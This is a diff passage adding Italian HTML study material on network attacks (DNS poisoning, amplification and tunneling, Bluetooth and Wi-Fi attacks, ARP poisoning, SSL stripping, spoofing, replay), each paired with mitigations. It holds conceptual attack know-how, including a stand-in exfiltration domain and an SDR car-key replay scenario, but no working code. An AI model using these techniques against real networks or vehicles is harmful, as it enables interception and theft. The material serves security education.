+    <dd>Nelle architetture cloud moderne, l'adozione di un'<strong>infrastruttura cloud elastica (Elastic Cloud Infrastructure)</strong> costituisce una mitigazione strutturale straordinaria. Grazie alla combinazione di Dynamic Load Balancing e servizi di Auto-scaling orizzontale, l'infrastruttura rileva lo stress prestazionale e provvede autonomamente, elastica e flessibile, a lanciare e accendere in tempo reale nuove istanze e server di backend aggiuntivi per assorbire ed elaborare il flusso di carico volumetrico anomalo. Questo aumento di scala dinamico consente all'applicazione di tollerare e neutralizzare le ondate di traffico transitorie del DoS, mantenendo le performance stabili per gli utenti legittimi senza subire fermi macchina distruttivi.</dd>
+  </dl>
+
+  <h3 id="dns-attacks">Domain Name System (DNS) e Attacchi Relativi</h3>
+  <p>
+    Il <strong>Domain Name System (DNS)</strong> rappresenta l'elenco telefonico di Internet: è un protocollo gerarchico e distribuito che traduce nomi di dominio leggibili dall'uomo (es. <code>www.esempio.it</code>) in indirizzi IP numerici (es. <code>192.0.2.1</code>) necessari per l'instradamento del traffico sulla rete globale. Poiché il DNS originale è nato senza presidi di sicurezza nativi ed autenticazione crittografica delle risposte, esso costituisce un bersaglio cruciale per gli attaccanti. Di seguito vengono analizzate le vulnerabilità, i vettori d'attacco e le difese a livello di protocollo e di gestione del dominio:
+  </p>
+
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>DNS Cache Poisoning / DNS Spoofing (Avvelenamento della cache DNS)</dt>
+    <dd>
+      Consiste nell'inserire record fasulli o malevoli all'interno della cache locale di un server <strong>DNS resolver</strong> (un server ricorsivo intermedio).
+      <br><strong>• In cosa consiste l'attacco:</strong> L'attaccante trasmette risposte DNS artefatte al resolver vittima prima che il server DNS legittimo di destinazione possa rispondere. Se il resolver accetta la risposta falsificata, memorizza in cache il record fraudolento. Da quel momento, chiunque richieda quel dominio riceverà l'IP controllato dal malintenzionato.
+      <br><strong>• Mitigazione principale:</strong> Attivazione del protocollo <strong>DNSSEC</strong> (DNS Security Extensions).
+    </dd>
+
+    <dt>DNSSEC (DNS Security Extensions)</dt>
+    <dd>
+      Estensione di sicurezza standard del protocollo DNS progettata per proteggere la risoluzione dei nomi da manomissioni e spoofing.
+      <br><strong>• Come funziona:</strong> Utilizza la crittografia asimmetrica per firmare digitalmente le zone DNS. Ciascuna risposta fornita da un server abilitato DNSSEC viene corredata da una <strong>Firma Digitale (Digital Signature)</strong> verificabile dal client (resolver ricorsivo) tramite chiavi pubbliche. Sebbene DNSSEC preservi l'integrità e provveda all'autenticazione dell'origine dei dati (Data Origin Authentication), <em>non fornisce riservatezza</em> (il traffico DNS rimane leggibile in chiaro).
+    </dd>
+
+    <dt>Digital Signature (Firma Digitale) nel DNS</dt>
+    <dd>
+      Nello schema di DNSSEC, una firma digitale viene generata dal server autoritativo firmando i record della zona (quali record A, AAAA, MX) con la chiave privata (KSK/ZSK). Il client ricorsivo recupera il record di firma (<code>RRSIG</code>) e la chiave pubblica (<code>DNSKEY</code>) e convalida la firma; questo garantisce che il <strong>DNS Response Traffic (Traffico di risposta DNS)</strong> non sia stato alterato lungo il percorso.
+    </dd>
+
+    <dt>DNS Amplification Attack (Attacco di Amplificazione DNS)</dt>
+    <dd>
+      Una tipologia di attacco DDoS riflesso e volumetrico estremamente comune.
+      <br><strong>• In cosa consiste l'attacco:</strong> L'hacker invia valanghe di query DNS ad "open resolvers" (server DNS pubblici disposti a rispondere a chiunque) simulando l'IP sorgente della vittima (IP Spoofing). Le query richiedono deliberatamente informazioni pesanti (es. interrogazioni di tipo <code>ANY</code> o record TXT) in modo da forzare il server a generare un mastodontico flusso di <strong>DNS Response Traffic (Traffico di risposta DNS)</strong> diretto esclusivamente verso la vittima insignita quale sorgente falsificata. Il fattore di amplificazione (rapporto tra query inviata e risposta ricevuta) può superare il 50x.
+      <br><strong>• Come si mitiga:</strong> Implementazione del <strong>Rate Limiting</strong> (RRL - Response Rate Limiting) sui server DNS per bloccare risposte ripetitive verso lo stesso IP bersaglio, e disabilitazione dei servizi di open resolver.
+    </dd>
+
+    <dt>Rate Limiting (Limitazione della frequenza nel DNS)</dt>
+    <dd>
+      Criterio di limitazione e sbarramento applicato ai server DNS per contenere l'impatto degli attacchi DDoS e di amplificazione. Consiste nel limitare rigorosamente il numero massimo di risposte che il server è disposto a spedire a un determinato client o gruppo di IP in un intervallo di tempo prestabilito (es. un massimo di 5 risposte al secondo per client), degradando o lasciando cadere le richieste in esubero.
+    </dd>
+
+    <dt>DNS Tunneling (Canale nascosto DNS)</dt>
+    <dd>
+      Vettore di attacco e di bypass dei firewall in cui il protocollo DNS viene abusato per incapsulare traffico arbitrario di terze parti (come comandi SSH, traffico web o payload di malware).
+      <br><strong>• In cosa consiste l'attacco:</strong> Sul computer infetto interno all'azienda gira un software speciale che codifica i dati sensibili o i comandi in porzioni di testo inserendoli all'interno del nome del sottodominio di una query DNS (es. <code>dati_rubati_base64.attacker.com</code>). Poiché i firewall aziendali permettono transitare quasi sempre il traffico DNS verso il server DNS ricorsivo interno (che a sua volta lo inoltrerà al Name Server autoritativo controllato dall'hacker), il malintenzionato riceve le informazioni esfiltrate in background bypassando le tutele di rete.
+      <br><strong>• Come si rileva e mitiga:</strong> Analisi approfondita dei log DNS con il rilevamento di query anomalamente lunghe, uso pesante di caratteri casuali nei domini o frequenza inusitata di interrogazioni verso domini registrati di fresco, e applicazione di firewall DNS intelligenti.
+    </dd>
+
+    <dt>DNS Zone Transfer Attack / AXFR Attack (Attacco di Trasferimento di Zona)</dt>
+    <dd>
+      Attacco incentrato sulla fase diagnostica o di ricognizione (Reconnaissance) preliminare.
+      <br><strong>• In cosa consiste l'attacco:</strong> Il trasferimento di zona (richiesta <code>AXFR</code>) è un meccanismo legittimo col quale i server DNS secondari di una ditta replicano l'intero database dei record DNS memorizzati sul server primario. Se il server primario viene configurato in modo improprio permettendo richieste AXFR a chiunque (e non solo ai secondari pre-approvati), l'attaccante lancia una richiesta di trasferimento scaricando istantaneamente l'elenco completo di tutti i domini, sottodomini, server sensibili ed indirizzi IP interni dell'organizzazione, accorciando drasticamente il tempo di mappatura della rete da colpire.
+      <br><strong>• Come si mitiga:</strong> Limitare severamente il trasferimento di zona AXFR abilitando la direttiva di restrizione IP o configurazioni TSIG (Transaction Signatures) con chiavi crittografiche simmetriche condivise tra i seuls server legittimi.
+    </dd>
+
+    <dt>Domain Hijacking (Dirottamento del Dominio)</dt>
+    <dd>
+      Offensiva basata non sul protocollo o traffico di rete, ma sull'appropriazione illegittima o modifica non autorizzata della proprietà di un intero dominio Internet presso il registrar (es. GoDaddy, Namecheap).
+      <br><strong>• In cosa consiste l'attacco:</strong> L'attaccante ottiene l'accesso alle credenziali d'ufficio dell'account dell'azienda presso il registrar (tramite phishing, brute force o social engineering), oppure effettua un <strong>Unauthorized Domain Registration Change (Cambiamento non autorizzato della registrazione)</strong> alterando l'indirizzo email di contatto o i server DNS autoritativi associati. Di conseguenza, l'intera rete aziendale ed i canali email associati vengono reindirizzati altrove, togliendo all'organizzazione legittima qualsiasi controllo d'impresa sul brand.
+      <br><strong>• Come si previene:</strong> Impiego di solide politiche di autenticazione MFA protette da chiavi fisiche per accedere all'account registrar, e l'adozione deliberata dei servizi di <strong>Domain Registry Lock Services (Servizi di blocco del registro)</strong>.
+    </dd>
+
+    <dt>Domain Registry Lock Services (Servizi di blocco del registro)</dt>
+    <dd>
+      Definito anche come Registry Lock, costituisce la protezione più tenace e blindata contro i tentativi di Domain Hijacking e le modifiche accidentali o fraudolente.
+      <br><strong>• Come funziona:</strong> Imposta uno stato protetto irreversibile direttamente a livello di Registro centrale del TLD (es. Verisign per i domini .com). Quando il blocco è attivo, qualsiasi tentativo di cambiare i Name Server autoritativi, modificare i record di proprietà o avviare trasferimenti di dominio viene bloccato a priori dall'elaborazione automatizzata. Per poter rimuovere la restrizione dello stato di blocco o consentire un <strong>Unauthorized Domain Registration Change</strong>, si attiva un processo offline asincrono di convalida umana, richiedendo che il personale autorizzato dell'azienda superi contatti telefonici protetti da passphrase pre-condivise e riscontri fisici diretti con lo staff del Registro.
+    </dd>
+  </dl>
+
+  <h3 id="wireless">Wireless attacks (Attacchi wireless)</h3>
+  <dl class="termlist">
+    <dt>Evil twin (Access point gemello malevolo)</dt>
+    <dd>Un attaccante crea un access point Wi-Fi con lo stesso SSID e caratteristiche di un AP legittimo. Gli utenti si connettono al falso AP credendolo legittimo. L'attaccante vede tutto il traffico non cifrato e può iniettare contenuti malevoli.<br><strong>• Mitigazione principale:</strong> Uso dello standard WPA3-Enterprise con protocollo EAP-TLS che convalida in modo mutuale l'identità dell'access point tramite certificati crittografici digitali emessi dalla CA interna aziendale, rifiutando la connessione in caso di certificato mancante o non valido, e l'impiego perenne di VPN aziendali.</dd>
+    <dt>Deauthentication attack</dt>
+    <dd>L'attaccante invia frame di deauthentication falsificati per disconnettere i client dall'AP legittimo, forzandoli a riconnettersi (possibilmente all'evil twin) o per catturare l'handshake WPA2 durante la riconnessione (per attacchi offline alla password).<br><strong>• Mitigazione principale:</strong> Abilitazione obbligatoria dello standard di sicurezza Wi-Fi <strong>802.11w PMF (Protected Management Frames)</strong>, che firma crittograficamente i pacchetti di controllo e gestione (tra cui le disconnessioni), impedendo ad estranei sul canale di falsificarli.</dd>
+    <dt>Jamming</dt>
+    <dd>Interferenza radio che rende inutilizzabile il canale wireless. Indicatore: degradazione o interruzione del segnale Wi-Fi in un'area specifica senza causa tecnica apparente.<br><strong>• Mitigazione principale:</strong> Installazione di sensori WIPS (Wireless Intrusion Prevention System) operanti in spettro continuo per triangolare ed individuare l'origine geografica di rumori ed interferenze nocive artificiali sul canale RF, e forzatura temporanea di routing dinamici su frequenze o canali meno compromessi.</dd>
+    
+    <dt>Insecure Pairing (Accoppiamento Non Sicuro)</dt>
+    <dd>Vulnerabilità o impostazione debole riscontrabile quando due periferiche Bluetooth completano il processo di accoppiamento (pairing) senza applicare crittografia robusta o meccanismi di autenticazione mutua (es. Just Works). Permette a intercettatori adiacenti di decodificare il traffico in chiaro o inserire un dispositivo malevolo nella catena di trust logica.<br><strong>• Mitigazione principale:</strong> Forzatura dei soli modelli di accoppiamento che richiedono un PIN o una passkey univoca e casuale (es. Secure Simple Pairing con Numeric Comparison), vietando l'uso di standard di accoppiamento non autenticati e vulnerabili in chiaro.</dd>
+
+    <dt>Device Spoofing (Falsificazione del Dispositivo)</dt>
+    <dd>Attacco mirato in cui l'attaccante falsifica le credenziali fisiche o identificatori di rete di un dispositivo legittimo (es. spoofing di MAC address Bluetooth o UUID di card RFID ed endpoint fidi). Consente di aggirare gli elenchi di controllo d'accesso (ACL) della rete fidata o costringere un host ad accoppiarsi al nodo malevolo simulato.<br><strong>• Mitigazione principale:</strong> Adozione di soluzioni di autenticazione forte e crittografia bilaterale a livello delle applicazioni, affinché l'accesso non si basi unicamente su attributi di rete facilmente falsificabili come l'indirizzo MAC.</dd>
+
+    <dt>Bluejacking (Spam via Bluetooth)</dt>
+    <dd>Pratica fastidiosa che consiste nell'invio di messaggi non richiesti, contatti commerciali o note di spam tramite Bluetooth a dispositivi mobili adiacenti configurati in modalità visibile/scopribile. Pur non compromettendo l'integrità dei dati o i file memorizzati, rappresenta un fastidio visivo.<br><strong>• Mitigazione principale:</strong> Impostazione permanente delle antenne Bluetooth in modalità non scopribile (Non-Discoverable) e spegnimento completo dell'interfaccia radio quando non è attivamente utilizzata.</dd>
+
+    <dt>Bluesnarfing (Furto Dati via Bluetooth)</dt>
+    <dd>Gravissimo attacco wireless a corto raggio mirato a stabilire una connessione non autorizzata verso un dispositivo Bluetooth vittima per sottrarne silenziosamente informazioni private, tra cui messaggi SMS, cache delle email, rubrica telefonica, foto e file personali memorizzati, senza il consenso o l'invito della vittima.<br><strong>• Mitigazione principale:</strong> Mantenimento dello stato invisibile del dispositivo, spegnimento preventivo del servizio radio in zone ad alta affluenza sconosciute, e installazione rigorosa di aggiornamenti e patch di sicurezza dell'OS.</dd>
+
+    <dt>Bluebugging (Controllo Remoto via Bluetooth)</dt>
+    <dd>Attacco estremamente intrusivo che sfrutta vulnerabilità Bluetooth per prendere il controllo logico quasi totale del dispositivo mobile bersaglio. Permette all'attaccante di effettuare chiamate telefoniche, spedire messaggi di testo a monte, intercettare le telefonate attive, ed attivare segretamente il microfono o la fotocamera per spionaggio ambientale.<br><strong>• Mitigazione principale:</strong> Revoca incondizionata di qualsiasi richiesta di accoppiamento spontanea proveniente dall'esterno, unita all'immediata applicazione degli update di sicurezza del sistema operativo forniti dai produttori.</dd>
+
+    <dt>Bluesmack (DoS via Bluetooth)</dt>
+    <dd>Attacco di tipo Denial of Service (DoS) contro la radio Bluetooth di un dispositivo. Si realizza inviando pacchetti L2CAP distorti o di dimensioni spropositate (equivalente wireless del classico attacco e-mail o Ping of Death), forzando il buffer della vittima a saturarsi e provocandone il crash o il congelamento hardware istantaneo.<br><strong>• Mitigazione principale:</strong> Aggiornamento sistematico del firmware dell'antenna e dei relativi driver di controllo per impedire buffer overflow legati all'elaborazione di pacchetti wireless di dimensioni anomale o deformati.</dd>
+
+    <dt>Blueborne (Vulnerabilità dello Stack Bluetooth)</dt>
+    <dd>Famiglia devastante di vulnerabilità logiche situate a basso livello all'interno dei driver dello stack Bluetooth di molteplici sistemi operativi (Android, iOS, Windows, Linux). Permette ad un attaccante vicino di eseguire codice arbitrario da remoto (RCE) e diffondere malware a catena nell'ambiente circostante a prescindere dal pairing preventivo o che il terminale sia impostato in modalità non visibile.<br><strong>• Mitigazione principale:</strong> Spegnimento immediato del servizio Bluetooth se non necessario, e installazione repentina dei bollettini software mensili di sicurezza rilasciati dal vendor del sistema operativo.</dd>
+  </dl>
+
+  <h4 style="margin-top: 24px; color: var(--navy); font-weight: 700;">Linee Guida e Mitigazioni del Rischio Bluetooth</h4>
+  <p>Per neutralizzare l'intera superficie d'attacco radio legata al protocollo Bluetooth, le buone prassi aziendali impongono l'applicazione rigorosa dei seguenti controlli di sicurezza:</p>
+  <ul style="margin-left: 20px; margin-bottom: 24px; line-height: 1.6;">
+    <li><strong>Disattivazione del Bluetooth (Turning off Bluetooth)</strong>: Spegnere integralmente l'antenna Bluetooth quando non si stanno utilizzando cuffie o periferiche fisse. Azzerare la radio distrugge del tutto il vettore di attacco aereo.</li>
+    <li><strong>Impostare la modalità non scopribile (Ensuring "non-discoverable" mode)</strong>: Configurare costantemente i dispositivi affinché rimangano invisibili ad altri nodi limitrofi. La visibilità temporanea (discoverable) deve venire sbloccata unicamente per la durata ristretta dell'accoppiamento manuale.</li>
+    <li><strong>Aggiornamenti regolari del dispositivo (Regularly updating devices)</strong>: Installare costantemente le patch di sicurezza ufficiali per sanare bachi ed exploit di fabbrica legati al driver di comunicazione (es. contromisure a Blueborne).</li>
+    <li><strong>Accoppiamento esclusivo con nodi attendibili (Only pairing with known & trusted devices)</strong>: Avviare e completare il pairing solo con accessori di chiara proprietà e di fonti certificate, bloccando preventivamente periferiche adiacenti non autorizzate.</li>
+    <li><strong>Utilizzare sempre PIN e Passkey univoci (Always using unique PINs or passkeys)</strong>: Evitare assoluta l'uso di codici PIN predefiniti standard (es. "0000" o "1234") durante la fase di accoppiamento. Imporre PIN complessi, casuali e unici per inibire tecniche di cracking radio.</li>
+    <li><strong>Diffidare di richieste di accoppiamento improvvise (Cautious of unsolicited connection requests)</strong>: Sviluppare consapevolezza nel personale (Security Awareness) affinché ignori o neghi sdegnosamente qualsiasi pop-up improvviso o inatteso di richiesta di connessione o accostamento Bluetooth.</li>
+    <li><strong>Impiegare la crittografia per i trasferimenti sensibili (Using encryption for sensitive data transfers)</strong>: Anche in caso di accoppiamento Bluetooth attivo, assicurarsi che lo scambio di dati strategici o confidenziali sia incapsulato in canali cifrati a livello superiore (es. crittografia end-to-end proprietaria o applicazioni conformi con autenticazione forte), scongiurando intercettazioni on-path se le chiavi del Bluetooth venissero violate.</li>
+  </ul>
+
+  <h3 id="on-path">On-path attack (Attacco sul percorso — MitM) e Snooping</h3>
+  <p>
+    Un <strong>on-path attack</strong> (storicamente noto come <strong>Man-in-the-Middle, MitM</strong>) rappresenta una classe di aggressioni informatiche in cui un attaccante si posiziona in modo invisibile ed intermedio all'interno del flusso di comunicazione attivo tra due host legittimi (tipicamente un client e un server). L'obiettivo primario dell'attaccante sul percorso è intercettare, monitorare ed eventualmente alterare o manipolare i dati scambiati senza che nessuna delle parti coinvolte si accorga della deviazione logica.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">I Vettori di Insediamento: Come l'Attaccante Consegue la Posizione On-Path</h4>
+  <p>
+    Per potersi posizionare in mezzo alle comunicazioni e fungere da intermediario, l'attaccante sfrutta diverse vulnerabilità di livello fisico e logico nei protocolli di rete:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>ARP Poisoning (o ARP Spoofing)</dt>
+    <dd>
+      Avviene a livello locale (LAN — Layer 2 del modello ISO/OSI). L'attaccante invia pacchetti ARP fasulli e non richiesti (Gratuitous ARP replies) alla vittima e al gateway di rete (router). In questi pacchetti, l'attaccante associa il proprio indirizzo fisico (MAC address) all'indirizzo IP del gateway legittimo (e viceversa). Le tabelle dei dispositivi (the ARP cache) ne vengono "avvelenate": da quel momento, tutto il traffico locale originato dalla vittima e destinato a Internet transiterà attraverso la scheda di rete dell'attaccante prima di essere inoltrato al gateway.<br><strong>• Mitigazione principale:</strong> Configurazione di <strong>Dynamic ARP Inspection (DAI)</strong> sugli switch di rete combinata con <strong>DHCP Snooping</strong> per convalidare l'autenticità dei pacchetti ARP prima del transito orizzontale.
+    </dd>
+
+    <dt>DNS Poisoning (o DNS Spoofing)</dt>
+    <dd>
+      L'attaccante inietta record di indirizzi contraffatti (es. record A o CNAME) nella memoria cache di un DNS resolver o di un server dei nomi. Quando il client tenta di navigare su un sito ufficiale (es. <code>banca-sicura.com</code>), la risoluzione dei nomi associa erroneamente quel dominio IP all'indirizzo dei server controllati dall'hacker. Il browser della vittima si collega così al finto server in modalità del tutto trasparente per l'utente, stabilendo una sessione intermediata dall'attaccante.<br><strong>• Mitigazione principale:</strong> Implementazione di <strong>DNSSEC</strong> (DNS Security Extensions) a tutti i livelli dell'infrastruttura per garantire l'origine e l'integrità del traffico DNS tramite firme asimmetriche.
+    </dd>
+
+    <dt>Rogue Wireless Access Point (Rogue WAP) e Evil Twin</dt>
+    <dd>
+      Un vettore di tipo aereo (Layer 1 e 2 Wireless). Un <strong>Rogue Access Point (WAP Silente)</strong> è un punto d'accesso Wi-Fi non autorizzato collegato fisicamente alla rete dell'azienda. L'attaccante può configurarlo anche come un <strong>Evil Twin</strong>: una finta antenna Wi-Fi configurata con lo stesso identico nome (SSID) e canali radio di una rete fidata o aziendale esistente. I dispositivi mobili dei dipendenti si collegano automaticamente al WAP pirata credendolo l'hotspot legittimo; l'attore malevolo, gestendo la finta antenna, incanala e controlla sul proprio gateway l'intero traffico internet degli ospiti connessi.<br><strong>• Mitigazione principale:</strong> Impiego di <strong>802.1X Wired Authentication</strong> per negare l'accesso alle porte ethernet aziendali a dispositivi Wi-Fi non approvati, integrato con soluzioni WIPS (Wireless Intrusion Prevention System) per rilevare continuativamente la presenza di antenne non aziendali confinanti.
+    </dd>
+
+    <dt>Rogue Hub / Switch</dt>
+    <dd>
+      Un'intrusione fisica. L'attore malevolo inserisce abusivamente una periferica concentratrice (un vecchio <strong>Hub</strong>, che per natura diffonde in broadcast ogni pacchetto di rete a tutte le sue porte, o uno <strong>Switch</strong> abusivamente pre-configurato per effettuare MAC Flooding o abilitare il Port Mirroring su un socket) in mezzo a un collegamento cablato legittimo (es. tra una presa a muro e un computer d'ufficio). Questo dispositivo ausiliario sdoppia e convoglia i frame verso un computer di sniffing presidiato dall'attaccante, permettendogli la cattura del traffico in chiaro.<br><strong>• Mitigazione principale:</strong> Abilitazione di politiche rigide di <strong>Port Security (Port Security limits)</strong> sugli switch fisici impostando un MAC limit restrittivo (massimo 1 MAC address per singola porta fisica) ed un'azione automatica di blocco/shutdown della porta stessa nel caso in cui un secondo indirizzo MAC (quello dell'Hub/Switch estraneo) venga rilevato.
+    </dd>
+
+    <dt>Snooping (o Sniffing / Eavesdropping)</dt>
+    <dd>
+      A differenza degli attacchi on-path attivi che manipolano e alterano la rete o i protocolli, lo <strong>snooping</strong> rappresenta la pura intercettazione passiva e silenziosa del traffico di transito (es. tramite un packet sniffer in modalità promiscua). L'attaccante raccoglie passivamente dati sensibili (password in chiaro, email, chat) senza modificare in alcun modo le trame dati, il che rende l'attacco invisibile ai tipici sistemi di monitoraggio della disponibilità.<br><strong>• Mitigazione principale:</strong> Cifratura completa ed universale a livello applicazione dell'intero traffico in transito (SSH, HTTPS/TLS, IPsec) per rendere i frame catturati del tout court illegibili allo sniffing, ed inibizione strutturale del traffico wireless tramite port isolation.
+    </dd>
+  </dl>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Le Tecniche di Sfruttamento On-Path e Crittografiche</h4>
+  <p>
+    Una volta stabilita la propria presenza sul percorso, l'attaccante adotta tecniche specifiche per decifrare il traffico sicuro HTTPS/TLS o manipolare i dati in transito:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>SSL Stripping (SSL / TLS Downgrade del Protocollo Web)</dt>
+    <dd>
+      Un attacco mirato a costringere un browser web a comunicare con il server in modalità normale (non crittografata via HTTP standard) anziché utilizzando il canale sicuro HTTPS (TLS). L'attaccante on-path intercetta la richiesta iniziale della vittima: stabilisce una sessione HTTPS cifrata con il server vero sul lato esterno, ma inoltra alla vittima una versione non cifrata HTTP (sul lato interno). Il browser della vittima vede l'interfaccia standard ma sprovvista del lucchetto di sicurezza HTTPS; se l'utente non fa attenzione e inserisce le proprie credenziali, queste viaggiano in chiaro via HTTP sul tratto LAN e vengono catturate immediatamente dall'attaccante in transito.
+    </dd>
+
+    <dt>Downgrade Attack (Attacco di Degradazione Crittografica)</dt>
+    <dd>
+      Una tecnica in cui l'attaccante si intromette intenzionalmente durante la fase iniziale di negoziazione (handshake) di un protocollo sicuro (como TLS, SSH o IPsec) tra client e server. Manipolando le comunicazioni di handshake, l'attaccante forza i due host ad abbandonare i protocolli di cifratura moderni sani (es. TLS 1.3) a favore di algoritmi obsoleti e vulnerabili (es. SSL 3.0, cifrari a blocchi deboli o chiavi cortissime) oppure costringe le radio mobili (come quelle cellulari mediante finti IMSI catchers) a degradare la connessione 4G/5G verso canali 2G privi di adeguati controlli di integrità. Una volta forzato l'uso dello standard debole, l'attore malevolo può violare ed estrarre la cifratura in tempo reale per recuperare i contenuti protetti.
+    </dd>
+
+    <dt>Relay Attack (Attacco di Inoltro) — Nota bene: DIFFERENZA CRUCIALE con Replay Attack</dt>
+    <dd>
+      È di estrema importanza non confondere il <strong>Relay Attack</strong> con l'attacco di <strong>Replay (Ripetizione)</strong>:
+      <br><strong>• Relay Attack (Inoltro in tempo reale)</strong>: È un attacco attivo in cui l'aggressore funge da ponte bidirezionale passivo / attivo in <strong>tempo reale</strong> per estendere a distanza la portata di una comunicazione autenticata che richiede la vicinanza fisica (es. comunicazioni NFC, lettori di Smart Card RFID, contactless token). L'hacker cattura le sfide inviate in quel preciso istante dal lettore legittimo, le trasmette a un complice distante tramite una chiamata di rete, il complice le fa recapitare al badge reale della vittima, e poi inoltra indietro la risposta dinamica firmata immediatamente. Non c'è differimento temporale né decifratura: è un vero e proprio "tunnel" in tempo reale.
+      <br><strong>• Replay Attack (Ripetizione differita)</strong>: Consiste nel registrare / memorizzare una o più trasmissioni fisse (es. un hash di password, un cookie o un segnale radio registrato) in un dato momento, per poi <strong>"rigiocarle" e trasmetterle nuovamente ore o giorni dopo</strong> al server per ottenere un accesso non autorizzato. Non richiede che la vittima o il suo dispositivo siano attivi o presenti al momento dell'autenticazione abusiva.
+    </dd>
+  </dl>
+
+  <p>
+    Lo scenario (attaccante che intercetta e riusa le credenziali di login
+    per accedere a informazioni finanziarie) descrive un on-path attack con credential
+    replay. Il <strong>pass-the-hash</strong> è una variante: invece delle
+    credenziali in chiaro, l'attaccante ruba e riusa l'hash NTLM dell'autenticazione.
+  </p>
+
+  <h3 id="spoofing">Spoofing (Falsificazione delle Identità e dei Protocolli)</h3>
+  <p>
+    Lo <strong>spoofing</strong> è la tecnica generica tramite cui un attaccante maschera o falsifica le proprie credenziali fisiche, indirizzi di rete, intestazioni di protocollo o identificativi per farsi accettare come nodo legittimo, bypassando le ACL e i meccanismi di trust del sistema bersaglio:
+  </p>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 24px;">
+    <dt>IP Spoofing</dt>
+    <dd>Consiste nel falsificare l'intestazione dell'indirizzo IP di sorgente all'interno dei pacchetti IP trasmessi. È la base degli attacchi DoS/DDoS riflessi o di bypass dei firewall basati esclusivamente su policy di IP-trusting.<br><strong>• Mitigazione principale:</strong> Attivazione del filtraggio <strong>BCP 38 (Ingress/Egress Filtering)</strong> sui router di perimetro per scartare pacchetti in uscita che mostrano indirizzi IP sorgente incoerenti con la rete d'origine, ed adozione di IPSec.</dd>
+
+    <dt>MAC Spoofing</dt>
+    <dd>Consiste nel reimpostare manualmente l'indirizzo fisico unico della scheda di rete (MAC address) per impersonare un host autorizzato o per aggirare i controles dinamici di MAC filtering applicati sugli switch o sulle porte Wi-Fi aziendali.<br><strong>• Mitigazione principale:</strong> Abilitazione di <strong>Port Security</strong> sugli interruttori LAN (switch) per porre limiti rigidi e vincolanti agli indirizzi MAC accettati per singola porta fisica, abbinata all'adozione del protocollo di autenticazione <strong>802.1X</strong>.</dd>
+
+    <dt>DNS Spoofing (o DNS Poisoning)</dt>
+    <dd>La corruzione deliberata delle corrispondenze IP-Dominio all'interno della memoria cache del server DNS per deviare in modo invisibile ed automatico i client verso portali contraffatti (phishing) controllati dall'aggressore.<br><strong>• Mitigazione principale:</strong> Configurazione universale del protocollo <strong>DNSSEC</strong> per firmare crittograficamente i record di zona sul server autoritativo e renderli immuni da manipolazioni.</dd>
+
+    <dt>Caller ID Spoofing</dt>
+    <dd>La falsificazione visiva del numero telefonico chiamante (es: simulando il centralino dell'assistenza bancaria) in ambito VoIP, adoperata per indurre in inganno l'utente durante campagne di truffa vocale (Vishing).<br><strong>• Mitigazione principale:</strong> Adozione ed enforcing degli standard crittografici di attestazione <strong>STIR/SHAKEN</strong> da parte dei carrier telefonici per autenticare digitalmente la legittimità delle chiamate in ingresso.</dd>
+  </dl>
+
+  <h3 id="cred-replay">Replay Attack (Attacco di Replay) e Credential Replay</h3>
+  <p>
+    Un <strong>Replay Attack (Attacco di Replay o Ripetizione)</strong> è una tipologia di aggressione logico-informatica in cui un utente malintenzionato intercetta una trasmissione di dati valida (come un pacchetto di autenticazione, un comando operativo o una transazione protetta) in transito tra un client e un server, e successivamente la <strong>ritrasmette o "rigioca" intatta</strong> al destinatario per impersonare il mittente legittimo o per duplicare un'operazione non autorizzata.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Perché l'Attacco di Replay è così Pericoloso?</h4>
+  <p>
+    Il pericolo primario risiede nel fatto che il replay attack <strong>bypassa completamente la robustezza dei sistemi di cifratura</strong>. L'attaccante non ha alcun bisogno di decifrare il traffico intercettato o di decodificare la chiave segreta (es. la password o una chiave crittografica RSA): tutto ciò che gli serve è catturare i blocchi di byte digitali validi (l'equivalente di una firma o di un badge elettronico registrato in transito) e inviarli nuovamente. Il sistema ricevente, vedendo pacchetti formattati e firmati correttamente con la chiave legittima, ritiene l'operazione valida ed esegue il comando duplicato.
+  </p>
+
+  <h4 style="color: var(--navy); margin-top: 15px; margin-bottom: 5px;">Esempi Pratici e Scenari d'Attacco Reali</h4>
+  <dl class="termlist" style="margin-left: 10px; margin-bottom: 25px;">
+    <dt>1. Il Replay di Transazioni Finanziarie (Web/API Replay)</dt>
+    <dd>
+      Si immagini che un dipendente utilizzi un portale web amministrativo per inviare una richiesta bancaria di trasferimento fondi: <em>"Invia $500 a Bob"</em>. L'applicazione crittografa e trasmette con successo la transazione con una chiamata API. Se l'applicazione soffre di vulnerabilità di replay e non implementa contromisure attive, un attaccante appostato sul percorso di rete cattura la chiamata HTTP/API crittografata. Anche senza poter leggere o comprendere i dettagli cifrati, l'attaccante la trasmette nuovamente al server bancario per altre 10 volte. Di conseguenza, il server elabora 10 distinti pagamenti da $500 a Bob, per un totale di $5000, ritenendo ogni richiesta autentica poiché i dati di firma interni rimangono formalmente corretti.
+    </dd>
+
+    <dt>2. Il Replay sui Sistemi Keyless (Smart Car o Radiocomandi)</dt>
+    <dd>
+      Un esempio famosissimo al di fuori dell'ambito puramente software riguarda l'intercettazione dei segnali radio delle chiavi elettroniche (Keyless Entry) delle automobili o dei telecomandi degli allarmi domestici. Quando il proprietario preme il tasto del telecomando per sbloccare la portiera, il trasmettitore invia una sequenza codificata di onde radio. Un ladro posizionato nelle vicinanze, munito di un ricetrasmettitore radio low-cost (SDR - Software Defined Radio, come un HackRF), cattura e memorizza la sequenza di bit in modulazione di ampiezza. Una volta allontanatosi il proprietario, il ladro riproduce (esegue il "replay") lo stesso identico segnale radio precedentemente catturato: l'auto lo riceve, decodifica il comando e sblocca la portiera istantaneamente, permettendo il furto del veicolo.
+    </dd>
+
+    <dt>3. Credential Replay (Replay di Credenziali e Identità)</dt>
+    <dd>
+      È il riutilizzo doloso di credenziali o di frammenti di esse (hash, ticket, token) per autenticarsi su un host. Le forme più insidiose includono:
